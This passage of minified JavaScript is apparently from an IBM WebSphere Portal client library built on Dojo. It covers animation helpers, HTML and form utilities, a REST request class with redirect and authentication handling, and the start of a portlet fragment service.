this._onAnimateCtx&&e.disconnect(this._onAnimateCtx),this._onAnimateCtx=e.connect(this._current,"onAnimate",this,"_onAnimate"),this._onEndCtx&&e.disconnect(this._onEndCtx),this._onEndCtx=e.connect(this._current,"onEnd",this,"_onEnd"),this._current.play.apply(this._current,arguments),this},pause:function(){if(this._current){var t=e.connect(this._current,"onPause",this,(function(o){this._fire("onPause",arguments),e.disconnect(t)}));this._current.pause()}return this},gotoPercent:function(t,o){this.pause();var r=this.duration*t;return this._current=null,e.some(this._animations,(function(e){return e.duration<=r?(this._current=e,!0):(r-=e.duration,!1)})),this._current&&this._current.gotoPercent(r/this._current.duration,o),this},stop:function(t){if(this._current){if(t){for(;this._index+1<this._animations.length;++this._index)this._animations[this._index].stop(!0);this._current=this._animations[this._index]}var o=e.connect(this._current,"onStop",this,(function(t){this._fire("onStop",arguments),e.disconnect(o)}));this._current.stop()}return this},status:function(){return this._current?this._current.status():"stopped"},destroy:function(){this._onAnimateCtx&&e.disconnect(this._onAnimateCtx),this._onEndCtx&&e.disconnect(this._onEndCtx)}}),e.extend(o,t),dojo.fx.chain=function(e){return new o(e)};var r=function(t){this._animations=t||[],this._connects=[],this._finished=0,this.duration=0,e.forEach(t,(function(t){var o=t.duration;t.delay&&(o+=t.delay),this.duration<o&&(this.duration=o),this._connects.push(e.connect(t,"onEnd",this,"_onEnd"))}),this),this._pseudoAnimation=new e.Animation({curve:[0,1],duration:this.duration});var o=this;e.forEach(["beforeBegin","onBegin","onPlay","onAnimate","onPause","onStop","onEnd"],(function(t){o._connects.push(e.connect(o._pseudoAnimation,t,(function(){o._fire(t,arguments)})))}))};e.extend(r,{_doAction:function(t,o){return e.forEach(this._animations,(function(e){e[t].apply(e,o)})),this},_onEnd:function(){++this._finished>this._animations.length&&this._fire("onEnd")},_call:function(e,t){var o=this._pseudoAnimation;o[e].apply(o,t)},play:function(e,t){return this._finished=0,this._doAction("play",arguments),this._call("play",arguments),this},pause:function(){return this._doAction("pause",arguments),this._call("pause",arguments),this},gotoPercent:function(t,o){var r=this.duration*t;return e.forEach(this._animations,(function(e){e.gotoPercent(e.duration<r?1:r/e.duration,o)})),this._call("gotoPercent",arguments),this},stop:function(e){return this._doAction("stop",arguments),this._call("stop",arguments),this},status:function(){return this._pseudoAnimation.status()},destroy:function(){e.forEach(this._connects,dojo.disconnect)}}),e.extend(r,t),dojo.fx.combine=function(e){return new r(e)},dojo.fx.wipeIn=function(t){var o,r=t.node=e.byId(t.node),n=r.style,i=e.animateProperty(e.mixin({properties:{height:{start:function(){if(o=n.overflow,n.overflow="hidden","hidden"==n.visibility||"none"==n.display)return n.height="1px",n.display="",n.visibility="",1;var t=e.style(r,"height");return Math.max(t,1)},end:function(){return r.scrollHeight}}}},t));return e.connect(i,"onEnd",(function(){n.height="auto",n.overflow=o})),i},dojo.fx.wipeOut=function(t){var o,r=(t.node=e.byId(t.node)).style,n=e.animateProperty(e.mixin({properties:{height:{end:1}}},t));return e.connect(n,"beforeBegin",(function(){o=r.overflow,r.overflow="hidden",r.display=""})),e.connect(n,"onEnd",(function(){r.overflow=o,r.height="auto",r.display="none"})),n},dojo.fx.slideTo=function(t){var o=t.node=e.byId(t.node),r=null,n=null,i=function(t){return function(){var o=e.getComputedStyle(t),i=o.position;if(r="absolute"==i?t.offsetTop:parseInt(o.top)||0,n="absolute"==i?t.offsetLeft:parseInt(o.left)||0,"absolute"!=i&&"relative"!=i){var a=e.position(t,!0);r=a.y,n=a.x,t.style.position="absolute",t.style.top=r+"px",t.style.left=n+"px"}}}(o);i();var a=e.animateProperty(e.mixin({properties:{top:t.top||0,left:t.left||0}},t));return e.connect(a,"beforeBegin",a,i),a}}()),dojo._hasResource["com.ibm.portal.utilities.html"]||(dojo._hasResource["com.ibm.portal.utilities.html"]=!0,dojo.provide("com.ibm.portal.utilities.html"),dojo.require("com.ibm.portal.utilities"),dojo.require("dojo.fx"),com.ibm.portal.utilities.html={createAnchor:function(e,t,o,r,n){ibm.portal.debug.entry("SkinRenderer.createAnchor",[e,t,o,r,n]);var i=document.createElement("A");return i.href=t,o&&(i.id=o),n&&(i.className=n),r&&i.appendChild(document.createTextNode(r)),e.appendChild(i),ibm.portal.debug.exit("SkinRenderer.createAnchor",[i]),i},createButton:function(e,t,o,r,n){ibm.portal.debug.entry("SkinRenderer.createButton",[e,t,o,r,n]);var i=document.createElement("BUTTON");return t&&(i.href=t),o&&(i.id=o),n&&(i.className=n),r&&i.appendChild(document.createTextNode(r)),e.appendChild(i),ibm.portal.debug.exit("SkinRenderer.createButton",[i]),i},createImage:function(e,t,o,r,n){ibm.portal.debug.entry("SkinRenderer.createImage",[e,t,o,r,n]);var i=document.createElement("IMG");return i.src=t,o&&(i.id=o),r&&(i.alt=r,i.setAttribute("title",r),"BUTTON"==e.nodeName&&e.setAttribute("title",r)),n&&(i.className=n),e.appendChild(i),ibm.portal.debug.exit("SkinRenderer.createImage",[i]),i},createImageAnchor:function(e,t,o,r,n){ibm.portal.debug.entry("SkinRenderer.createImageAnchor",[e,t,o,r,n]);var i=com.ibm.portal.utilities.html.createAnchor(e,"javascript:void(0);"),a=document.createElement("IMG");return a.src=t,o&&(a.id=o),r&&(a.alt=r,a.title=r),n&&(a.className=n),i.appendChild(a),ibm.portal.debug.exit("SkinRenderer.createImageAnchor",[a]),i},createTemporaryMarkupDiv:function(e){ibm.portal.debug.entry("html.createTemporaryMarkupDiv");var t={markup:e,objects:{}};(dojo.isIE||void 0!==window.ActiveXObject)&&((t=com.ibm.portal.utilities.html.extractObjectElementsFromString(e)).markup=com.ibm.portal.utilities.html.replaceForms(t.markup));var o=document.createElement("DIV");return dojo.body().appendChild(o),o.setAttribute("style","display:none"),o.innerHTML="<p style='display: none;'>&nbsp;</p>"+t.markup,ibm.portal.debug.exit("html.createTemporaryMarkupDiv",[o]),{node:o,objects:t.objects}},replaceTemporaryMarkup:function(e,t){var o=e.node.childNodes;if(o&&e.node!=t)for(;o.length>0;)t.appendChild(o[0]);(dojo.isIE||void 0!==window.ActiveXObject)&&(com.ibm.portal.utilities.html.replaceObjectElementsInMarkup(e.objects),com.ibm.portal.utilities.html.replaceFormMarkers(t))},extractObjectElementsFromString:function(e){var t={},o=/<object/gi,r=/<\/object>/gi,n=e,i=null;try{if((i=o.exec(n))&&i.index>-1)for(var a,s,l,d,c=i.index;c>-1;){if(a=n.substring(0,c),s=n.indexOf(">",c),"/"==n.charAt(s-1)){if(o.lastIndex=s,i=o.exec(n)){c=i.index;continue}break}if(r.lastIndex=c,!(i=r.exec(n)))break;if(s=i.index,l=n.substring(c,s+9),n=a+"<div id='"+(d=dojo.dnd.getUniqueId())+"'></div>"+n.substring(s+9),t[d]=l,o.lastIndex=0,!(i=o.exec(n)))break;c=i.index}e=n}catch(e){t={}}return{markup:e,objects:t}},replaceObjectElementsInMarkup:function(e){for(var t in e){var o=dojo.byId(t);o&&(o.outerHTML=e[t])}},removeNodesOnCondition:function(e,t){if(t||(t=function(){return!1}),e&&e.childNodes)for(var o=0;o<e.childNodes.length;o++)if(t(e.childNodes[o])){var r=e.childNodes[o];e.removeChild(r),delete r,o--}else this.removeNodesOnCondition(e.childNodes[o],t)},getElementsByTagNames:function(e){ibm.portal.debug.entry("html.getElementsByTagNames",[e]);for(var t=new Array,o=1;o<arguments.length;o++){var r=e.getElementsByTagName(arguments[o]);ibm.portal.debug.text("found "+r.length+" "+arguments[o]+" tags.");for(var n=0;n<r.length;n++)t.push(r[n])}return ibm.portal.debug.exit("html.getElementsByTagNames",[t]),t},getX:function(e){ibm.portal.debug.entry("html.getX",[e]);var t=0;return null!=e&&(null!=e.offsetParent&&(t+=com.ibm.portal.utilities.html.getX(e.offsetParent)),null!=e&&(t+=e.offsetLeft)),ibm.portal.debug.exit("html.getX",[t]),t},getY:function(e){ibm.portal.debug.entry("html.getY"[e]);var t=0;return null!=e&&(null!=e.offsetParent&&(t+=com.ibm.portal.utilities.html.getY(e.offsetParent)),null!=e&&(t+=e.offsetTop)),ibm.portal.debug.exit("html.getY",[t]),t},convertFormToQuery:function(e,t){ibm.portal.debug.entry("html.convertFormToQuery",[e,t]);for(var o=this.getElementsByTagNames(e,"input","select","textarea","button"),r="",n=0,i=0;i<o.length;i++)for(var a=this.convertInputToNameValuePairs(o[i],t),s=0;s<a.length;s++){var l=a[s];if(""!=l.name){0!=n&&(r+="&"),r+=encodeURIComponent(l.name);for(var d=0;d<l.values.length;d++)r+=0==d?"="+encodeURIComponent(l.values[d]):"&"+encodeURIComponent(l.name)+"="+encodeURIComponent(l.values[d]);n+=1}}return ibm.portal.debug.exit("html.convertFormToQuery",r),r},convertInputToNameValuePairs:function(e,t){ibm.portal.debug.entry("html.convertInputToNameValuePairs",[e,t]);var o=e.type;ibm.portal.debug.text("Input type is: "+o),ibm.portal.debug.text("Input name is: "+e.name);var r="",n=[],i=[];if(!e.disabled)switch(o.toLowerCase()){case"text":case"password":case"hidden":default:r=e.name,n.push(e.value),i.push({name:r,values:n});break;case"reset":case"button":(!t||e.name==t.name&&e.value==t.value)&&(r=e.name,n.push(e.value),i.push({name:r,values:n}));break;case"radio":case"checkbox":e.checked&&(r=e.name,n.push(e.value)),i.push({name:r,values:n});break;case"image":t&&e.name!=t||(r=e.name,e.value&&(n.push(e.value),i.push({name:r,values:n})),i.push({name:r+".x",values:[this.getX(e)]}),i.push({name:r+".y",values:[this.getY(e)]}));break;case"submit":(!t||e.name==t.name&&e.value==t.value)&&(r=e.name,e.value&&n.push(e.value),i.push({name:r,values:n}));break;case"select-one":case"select-multiple":r=e.name;for(var a=0;a<e.options.length;a++)if(e.options[a].selected){var s=e.options[a].value?e.options[a].value:e.options[a].text;n.push(s)}0!=n.length&&i.push({name:r,values:n});case"file":}return ibm.portal.debug.exit("html.convertInputToNameValuePairs",i),i},isHidden:function(e){return"none"==dojo.style(e,"display")},hide:function(e){dojo.fx.wipeOut({node:e,duration:5}).play()},show:function(e){dojo.fx.wipeIn({node:e,duration:5}).play()},isDescendantOf:function(e,t){e=e.parentNode;for(var o=!1;e&&!o;)e==t&&(o=!0),e=e.parentNode;return o},safeClean:function(e,t){if(e&&1==e.nodeType){(dojo.isIE||void 0!==window.ActiveXObject)&&com.ibm.portal.utilities.html.cleanForms(e);var o=com.ibm.portal.utilities.domData;dojo.query("[duid]",e).forEach((function(e){var t=o.getManager(e);t&&t.cleanNode(e),dojo.destroy(e)})),e.innerHTML="",!t&&window.CollectGarbage&&window.CollectGarbage()}}},_4ce=/<\w+([^>]*)>/i,_4cf=/([\w-]+)=/i,_4d0={formNodes:[],getAttributeNames:function(e){var t=[];if(e){var o=e.outerHTML,r=_4ce.exec(o);if(r&&r.length>1){var n=r[1];for(r=_4cf.exec(n);r&&r.index>-1;)t.push(r[1]),n=n.substr(r.index+r[0].length),r=_4cf.exec(n)}}return t},replaceForms:function(e){return e.replace(/<form/gi,'<div data-csa-xform="true"').replace(/<\/form>/gi,"</div>")},replaceFormMarkers:function(e){dojo.query("[data-csa-xform]",e).forEach((function(e){var t=_4d0.getNode(e.getAttribute("name"));e.parentNode.insertBefore(t,e),_4d0.moveContents(e,t),e.innerHTML="",_4d0.copyAttributes(e,t),dojo.destroy(e),e=null}))},getNode:function(e){var t;return _4d0.formNodes.length>0?e?(t=_4d0.checkFormBank(e))?(ibm.portal.debug.text("getNode: returning form with name from bank: "+t.outerHTML),t):(ibm.portal.debug.text("getNode: bank did not have a form with name"),_4d0.createForm(e)):(t=_4d0.checkFormBank(null))?(ibm.portal.debug.text("getNode: no name specified, returning form from bank: "+t.outerHTML),t):(ibm.portal.debug.text("getNode: no name specified, no blank form in bank"),_4d0.createForm(null)):(ibm.portal.debug.text("getNode: no forms in bank"),_4d0.createForm(e))},checkFormBank:function(e){var t,o,r=_4d0.formNodes.length;if(r>0){for(t=0;t<r;t++)if(e&&_4d0.formNodes[t].getAttribute("name")){if(_4d0.formNodes[t].getAttribute("name").toLowerCase()==e.toLowerCase())return o=_4d0.formNodes[t],ibm.portal.debug.text("checkFormBank: returning "+o.toString()),_4d0.formNodes.splice(t,1),o}else if(!e||!_4d0.formNodes[t].getAttribute("name"))return o=_4d0.formNodes[t],ibm.portal.debug.text("checkFormBank: returning null form from bank"),_4d0.formNodes.splice(t,1),o;return ibm.portal.debug.text("checkFormBank: no attributes match returning null"),null}return ibm.portal.debug.text("checkFormBank: formBank is empty"),null},createForm:function(e){var t;return null!=e?(ibm.portal.debug.text("createForm: creating form with name"),t=document.createElement("<form name='"+e+"' ></form>")):(ibm.portal.debug.text("createForm: creating blank form"),t=document.createElement("form")),t._attachEvent=t.attachEvent,t._listeners=[],t.attachEvent=function(e,t){return this._listeners.push(t),this._attachEvent(e,t)},t},returnNode:function(e){if(e){if(e._listeners)for(;e._listeners.length>0;)e.detachEvent(e._listeners.shift());var t=com.ibm.portal.utilities.domData.getManager(e);t&&t.cleanNode(e),com.ibm.portal.utilities.html.safeClean(e),_4d0.clearAttributes(e),e.parentNode&&e.parentNode.removeChild(e),_4d0.formNodes.push(e)}},clearAttributes:function(e){if(e){var t,o=_4d0.getAttributeNames(e);if(o)for(var r=0;r<o.length;r++)"duid"!=(t=o[r])&&"name"!=t.toLowerCase()&&e.removeAttribute(t)}},copyAttributes:function(e,t){if(e){var o,r,n=_4d0.getAttributeNames(e);if(n)for(var i=0;i<n.length;i++)"data-csa-xform"!=(o=n[i])&&(r=e.getAttributeNode(o))&&(ibm.portal.debug.text("copyAttributes is setting both enctype and encoding to: "+r.value),"enctype"==o||"encoding"==o?(t.setAttribute("enctype",r.value),t.setAttribute("encoding",r.value)):(ibm.portal.debug.text("copyAttributes is setting: "+o+" to: "+r.value),t.setAttribute(o.toLowerCase(),r.value)));t.style.cssText=e.style.cssText}},moveContents:function(e,t){var o=e.childNodes;if(o&&e!=t)for(;o.length>0;)t.appendChild(o[0])},cleanForms:function(e){e&&dojo.query("form",e).forEach((function(e){_4d0.returnNode(e)}))}},dojo.mixin(com.ibm.portal.utilities.html,{replaceForms:_4d0.replaceForms,replaceFormMarkers:_4d0.replaceFormMarkers,cleanForms:_4d0.cleanForms}),dojo.addOnWindowUnload((function(){for(var e;_4d0.formNodes.length>0;)if(e=_4d0.formNodes.shift()){var t=com.ibm.portal.utilities.domData.getManager(e);t&&t.cleanNode(e),e._attachEvent=null,e.attachEvent=null,e._listeners=null}}))),dojo._hasResource["com.ibm.portal.services.PortalRestServiceRequest"]||(dojo._hasResource["com.ibm.portal.services.PortalRestServiceRequest"]=!0,dojo.provide("com.ibm.portal.services.PortalRestServiceRequest"),dojo.require("com.ibm.ajax.auth"),dojo.require("com.ibm.portal.EventBroker"),dojo.require("com.ibm.portal.services.PortalRestServiceRequestQueue"),dojo.declare("com.ibm.portal.services.ContentHandlerURL",null,{constructor:function(e,t,o,r){if(ibm.portal.debug.entry("ContentHandlerURL.constructor",[e,t,o,r]),null==e)return null;t||(t=2);var n=com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState().getLocale();n&&(r?r+="&locale="+n:r="&locale="+n),this.url="","?"==e.charAt(0)?this.url=this._fromQueryString(e,r):"/"==e.charAt(0)?(this.url=e,this.url.indexOf("rep=compact")<0&&this.url.indexOf("rep=full")<0&&(-1!=e.indexOf("?")?this.url=this.url+"&rep=compact":this.url=this.url+"?rep=compact"),r&&(this.url=this.url+r)):this.url=this._fromURI(e,t,"download",r),ibm.portal.debug.exit("ContentHandlerURL.constructor")},_fromQueryString:function(e,t){ibm.portal.debug.entry("fromQueryString",[e]);var o=ibmPortalConfig.contentHandlerURI+e;return o=o.replace(/&amp;/g,"&"),t&&(o+=t),o.indexOf("rep=compact")<0&&o.indexOf("rep=full")<0&&(o+="&rep=compact"),ibm.portal.debug.exit("fromQueryString",[o]),o},_fromURI:function(e,t,o,r){ibm.portal.debug.entry("ContentHandlerURL._fromURI",[e,t,o,r]);var n="?uri="+(e=com.ibm.portal.utilities.encodeURI(e));return t&&(n=n+"&levels="+encodeURIComponent(t)),o&&(n=n+"&mode="+encodeURIComponent(o)),r&&(n+=r),n.indexOf("rep=compact")<0&&n.indexOf("rep=full")<0&&(n+="&rep=compact"),this._fromQueryString(n)},getURI:function(){return ibm.portal.debug.entry("ContentHandlerURL.getURI"),com.ibm.portal.utilities.decodeURI(this._extractParamValue("uri"))},getLevels:function(){return this._extractParamValue("levels")},getVerb:function(){return this._extractParamValue("verb")},_extractParamValue:function(e){ibm.portal.debug.entry("ContentHandlerURL._extractParamValue",[e]);var t=this.url.indexOf(e),o=this.url.indexOf("&",t),r=this.url.slice(t+e.length+1,o);return ibm.portal.debug.exit("ContentHandlerURL._extractParamValue",[r]),r}}),dojo.require("com.ibm.portal.utilities.html"),dojo.declare("com.ibm.portal.services.PortalRestServiceForm",null,{method:"GET",isMultipart:!1,encoding:"application/x-www-form-urlencoded",DomId:null,constructor:function(e){e.getAttributeNode("method")&&(this.method=e.getAttributeNode("method").value),e.getAttributeNode("encType")&&(this.encoding=e.getAttributeNode("encType").value),e.getAttributeNode("id")?this.DomId=e.getAttributeNode("id").value:DomId=e,this.isMultipart="multipart/form-data"==this.encoding},getDOMElement:function(){return dojo.byId(this.DomId)},submit:function(){this.getDOMElement().submit()},toQuery:function(){return com.ibm.portal.utilities.html.convertFormToQuery(this.getDOMElement())}}),com.ibm.portal.services.REQUEST_QUEUE=new com.ibm.portal.services.PortalRestServiceRequestQueue,dojo.declare("com.ibm.portal.services.PortalRestServiceRequest",null,{constructor:function(e,t,o,r){ibm.portal.debug.entry("PortalRestServiceRequest.constructor",[e,t,o,r]),this._feedURI=e.url,this._textOnly=o,this._sync=r,this._form=t,this._customResponseValidator=null,this._onauthenticated=null,this._sync||(this._sync=!1),ibm.portal.debug.exit("PortalRestServiceRequest.constructor")},cancelled:!1,_deferred:void 0,setAuthenticationValidator:function(e){this._customResponseValidator=e},setOnAuthenticatedHandler:function(e){this._onauthenticated=e},create:function(e,t,o){this.cancelled||this._doXmlHttpRequest("POST",e,t,o)},read:function(e,t){if(ibm.portal.debug.entry("PortalRestServiceRequest.read",[e,t]),!this.cancelled)if(this._sync)com.ibm.portal.EVENT_BROKER.startRequest.fire({uri:this._feedURI}),this._textOnly?this._retrieveRawFeed(e,t):this._retrieve(e,t);else{ibm.portal.debug.text("Queueing request!");var o=com.ibm.portal.services.REQUEST_QUEUE,r=this;o.add({execute:function(o){if(r.cancelled)o&&o();else{com.ibm.portal.EVENT_BROKER.startRequest.fire({uri:r._feedURI});var n=function(t,r,n,i){e(t,r,n,i),o&&o()};r._textOnly?r._retrieveRawFeed(n,t):r._retrieve(n,t)}}})}ibm.portal.debug.exit("PortalRestServiceRequest.read")},update:function(e,t,o){this.cancelled||this._doXmlHttpRequest("Put",e,t,o)},remove:function(e,t){this.cancelled||this._doXmlHttpRequest("Delete",null,e,t)},cancel:function(){this.cancelled=!0,void 0!==this._deferred&&this._deferred.cancel()},_retrieveRawFeed:function(e,t){ibm.portal.debug.entry("_retrieveRawFeed",[e,t]);var o=this;dojo.xhrGet({url:this._feedURI,load:function(r,n,i){e(n,t),com.ibm.portal.EVENT_BROKER.endRequest.fire({uri:o._feedURI})},sync:this._sync}),ibm.portal.debug.exit("_retrieveRawFeed")},_retrieve:function(e,t,o,r){ibm.portal.debug.entry("_retrieve",[e]),this._form&&this._form.isMultipart?this._doIframeRequest(e,t):this._doXmlHttpRequest("Get",null,e,t),ibm.portal.debug.exit("PortalRestServiceRequest._retrieve")},_doIframeRequest:function(e,t){ibm.portal.debug.entry("PortalRestServiceRequest._doIframeRequest",[e]);var o=null,r=dojo.dnd.getUniqueId();if(dojo.isIE||void 0!==window.ActiveXObject){o=document.createElement("<iframe name='"+r+"' id='"+r+"' src='about:blank' onload='com.ibm.portal.aggregation.forms.PORTLET_FORM_HANDLER.handleMultiPartResult(this.id);'></iframe>"),com.ibm.portal.aggregation.forms.PORTLET_FORM_HANDLER._callbackfns[r]={fn:e,args:t};var n=new com.ibm.portal.utilities.HttpUrl(this._feedURI);n.addParameter("ibm.web2.contentType","text/plain"),this._form.getDOMElement().setAttribute("action",n.toString())}else{ibm.portal.debug.text("Creating the iframe... name is: "+r+"; url is: "+this._feedURI),(o=document.createElement("IFRAME")).setAttribute("name",r),o.setAttribute("id",r);var i=this;o.onload=function(){var o=window.frames[r].document;e("load",o,null,t),com.ibm.portal.EVENT_BROKER.endRequest.fire({uri:i._feedURI})},this._form.getDOMElement().setAttribute("action",this._feedURI)}o.style.visibility="hidden",o.style.height="1px",o.style.width="1px",document.body.appendChild(o),window.frames[r].name!=r&&(window.frames[r].name=r),ibm.portal.debug.text("Setting the iframe target attribute to: "+r),this._form.getDOMElement().setAttribute("target",r),this._form.submit(),ibm.portal.debug.exit("PortalRestServiceRequest._doIframeRequest")},isValidRedirect:function(e,t){ibm.portal.debug.text("URLS request: "+e+" redirect: "+t);e.indexOf("http");var o=!1;if(0==t.indexOf("http")){var r=e.indexOf("//"),n=t.indexOf("//");if(r>0&&n>0){var i=e.indexOf(":",r),a=t.indexOf(":",n);i<0&&(i=e.indexOf("/",r+2)),a<0&&(a=t.indexOf("/",n+2));var s=e.substring(r+2,i);ibm.portal.debug.text("request Host is: "+s);var l=t.substring(n+2,a);ibm.portal.debug.text("redirect Host is: "+l),s.toLowerCase()==l.toLowerCase()&&(o=!0)}}else o=!0,ibm.portal.debug.text("PortalRestServiceRequest.isValid returning true - relative url");return ibm.portal.debug.text("PortalRestServiceRequest._isValidRedirect returning:"+o),o},_doXmlHttpRequest:function(e,t,o,r){ibm.portal.debug.entry("PortalRestServiceRequest._doXmlHttpRequest",[e,t,o,r]),ibm.portal.debug.text("Attempting to retrieve: "+this._feedURI+" using method: "+e+"; synchronously? "+this._sync);var n=this,i={url:this._feedURI,content:{},headers:{"X-IBM-XHR":"true"},handle:function(e,t){if(ibm.portal.debug.entry("PortalRestServiceRequest.handle",[e,t]),e instanceof Error&&"cancel"===e.dojoType)o("cancel",e,null,r);else{var i=t.xhr;ibm.portal.debug.text("XHR object: "+i);var a=com.ibm.portal.services.PortalRestServiceConfig,s=i.getResponseHeader("X-Request-Digest");if(s&&(a.digest=s),200==i.status){var l=e,d=i.getResponseHeader("IBM-Web2-Location");if(d&&n.isValidRedirect(top.location.href,d)&&d.indexOf(ibmPortalConfig.portalProtectedURI)>=0&&n._feedURI.indexOf(ibmPortalConfig.portalPublicURI)>=0)return void(top.location.href=d);var c=i.getResponseHeader("Content-Type");if(ibm.portal.debug.text("content-type is: "+c),/^text\/html/.exec(c)&&d&&(d.indexOf(ibmPortalConfig.portalProtectedURI)>-1||d.indexOf(ibmPortalConfig.portalPublicURI)>-1)&&n.isValidRedirect(top.location.href,d))return ibm.portal.debug.text("content-type is text .. follow IBM-Web2-Location"),void(top.location.href=d);var u=com.ibm.ajax.auth,h=!1;if(n._customResponseValidator&&(h=n._customResponseValidator(e,t)),h||(h=u.isAuthenticationRequired(e,t)),h)return void u.authenticationHandler(e,t,n._onauthenticated);if(ibm.portal.debug.text("Read feed: "+n._feedURI),dojo.isIE||void 0!==window.ActiveXObject){var p=com.ibm.portal.xslt.loadXmlString(l);o("load",p,i,r)}else o("load",l,i,r)}else{if(dojo.isFF&&0==t.xhr.status)return;if(401==i.status||0==i.status)return ibm.portal.debug.text("Basic auth 401 found, trigger reload"),void com.ibm.ajax.auth.authenticationHandler();o("error",e,i,r)}com.ibm.portal.EVENT_BROKER.endRequest.fire({uri:n._feedURI}),ibm.portal.debug.exit("PortalRestServiceRequest.handle")}},sync:this._sync,handleAs:"xml"};this._form&&(i.content=dojo.queryToObject(this._form.toQuery()),e=this._form.method),"GET"!=(e=e.toUpperCase())&&"POST"!=e&&ibmPortalConfig&&ibmPortalConfig.xMethodOverride&&(i.headers["X-Method-Override"]=e.toUpperCase(),e="Post"),"PUT"==e&&t?i.putData=t:"POST"==e&&t&&(i.postData=t),(dojo.isIE||void 0!==window.ActiveXObject)&&(i.content["ibm.web2.contentType"]="text/xml",i.handleAs="text");var a=com.ibm.portal.services.PortalRestServiceConfig;a.timeout&&(i.timeout=a.timeout),a.digest&&(i.content.digest=a.digest),e=com.ibm.portal.utilities.string.properCase(e);var s=dojo["xhr"+e];if(!s)throw new Error("Invalid request method attempted: "+e);this._deferred=s(i),ibm.portal.debug.exit("PortalRestServiceRequest._doXmlHttpRequest")},toString:function(){return this._feedURI}}),com.ibm.portal.services.PortalRestServiceConfig={timeout:null,digest:null},_51b=!1,com.ibm.ajax.auth.setAuthenticationHandler((function(){if(!_51b)if(void 0===document.isCSA)top.location.reload();else{_51b=!0,ibm.portal.debug.entry("DefaultAuthenticationHandler"),ibm.portal.debug.text("Illegal response content-type detected!"),ibm.portal.debug.text("Parameterized redirect URL is: "+ibmPortalConfig.contentModelBlankURL);var e=com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState(),t=ibmPortalConfig.contentModelBlankURL.replace("-----oid-----",e.getPageSelection());if(ibm.portal.debug.text("fullPageRefreshURL is currently: "+t),null!=dojo.cookie("WASReqURL")){var o="WASReqURL="+e.createLinkToCurrentState()+"; path=/";document.cookie=o}ibm.portal.debug.text("Redirecting to: "+t),com.ibm.portal.EVENT_BROKER.redirect.fire({url:t}),_51b=!1,top.location.href=t,ibm.portal.debug.exit("DefaultAuthenticationHandler")}}))),dojo._hasResource["com.ibm.portal.services.PortletFragmentService"]||(dojo._hasResource["com.ibm.portal.services.PortletFragmentService"]=!0,dojo.provide("com.ibm.portal.services.PortletFragmentService"),dojo.require("dojox.data.dom"),dojo.require("com.ibm.portal.services.PortalRestServiceRequest"),dojo.require("com.ibm.portal.utilities"),dojo.require("com.ibm.portal.debug"),dojo.require("com.ibm.portal.EventBroker"),dojo.declare("com.ibm.portal.services.PortletFragmentURL",null,{constructor:function(e){0==e.indexOf("?uri=")?(this.url=ibmPortalConfig.portalURI+e,this.url=this.url.replace(/&amp;/g,"&"),this.url=this.url.replace(/lm:/,"pm:")):0==e.indexOf("lm:")?(this.url=ibmPortalConfig.portalURI+"?uri=fragment:"+e,this.url=this.url.replace(/lm:/,"pm:")):this.url=e}}),dojo.declare("com.ibm.portal.services.PortletInfo",null,{constructor:function(e,t,o,r,n,i,a,s,l,d,c,u){ibm.portal.debug.entry("PortletInfo.constructor",[e,t,o,r,n,i,s,u]),this.windowId=e,this.portletId=t,this.uri="fragment:pm:oid:"+e+"@oid:"+t,this.markup=o,this.portletModes=r,this.windowStates=n,this.dependentPortlets=i,this.otherPortlets=a,this.stateVaryExpressions=l,this.updatedState=s,this.currentMode=d,this.currentWindowState=c,this.portletTitle=u,ibm.portal.debug.exit("PortletInfo.constructor")}}),dojo.declare("com.ibm.portal.services.PortletFragmentService",null,{namespaces:{xsl:"http://www.w3.org/1999/XSL/Transform",thr:"http://purl.org/syndication/thread/1.0",atom:"http://www.w3.org/2005/Atom",xhtml:"http://www.w3.org/1999/xhtml",model:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0.1/portal-model-elements",base:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0/ibm-portal-composite-base",portal:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0.1/portal-model",xsi:"http://www.w3.org/2001/XMLSchema-instance",state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state","state-vary":"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state-vary"},activeRequests:{},constructor:function(){this.staticContext=com.ibm.portal.services.PortletFragmentService.prototype},_flagPortletUrl:function(e,t){ibm.portal.debug.entry("PortletFragmentService._flagPortletUrl",[e]);var o=e.indexOf("uri=fragment:pm:oid:"),r=new com.ibm.portal.utilities.HttpUrl(e);return r.addParameter("ibm.web2.keepRenderMode","false"),o<0&&(t=t.replace(/lm:/g,"fragment:pm:"),r.addParameter("uri",t)),ibm.portal.debug.exit("PortletFragmentService._flagPortletUrl",[r.toString()]),r.toString()},getPortletInfo:function(_52d,_52e,_52f,form,_530){if(ibm.portal.debug.entry("PortletFragmentService.getPortletInfo",[_52d,_52e,_52f,form,_530]),"#"==_52e||_52e==window.location.href+"#")return ibm.portal.debug.text("Illegal portlet url provided: "+_52e),ibm.portal.debug.text("Aborting request."),!1;if(com.ibm.portal.utilities.isJavascriptUrl(_52e))return eval(_52e);var _531=_52e;if(0==_531.indexOf(top.location.href))for(_531=_531.substring(top.location.href.length);_531.length>0&&"/"==_531.charAt(0);)_531=_531.substring(1);if(0==_531.indexOf("?")){var _532=com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState();_52e=_532.resolveRelativePortletURL(_531)}if(com.ibm.portal.utilities.isExternalUrl(_52e))self.location.href=_52e;else{var url={url:this._flagPortletUrl(_52e,_52d)},_533=ibmPortalConfig.enforceOneActivePortletRequest;if(_533){var _534=this.staticContext.activeRequests;void 0!==_534[_52d]&&null!==_534[_52d]&&(_534[_52d].cancel(),com.ibm.portal.EVENT_BROKER.cancelFragmentUpdate.fire({id:_52d}),_534[_52d]=null)}var _535=new com.ibm.portal.services.PortalRestServiceRequest(url,form);_530||com.ibm.portal.EVENT_BROKER.startFragment.fire({id:_52d}),_533&&(_534[_52d]=_535);var me=this;_535.read((function(e,t,o){if(_533&&(_534[_52d]=null),404==o.status){for(var 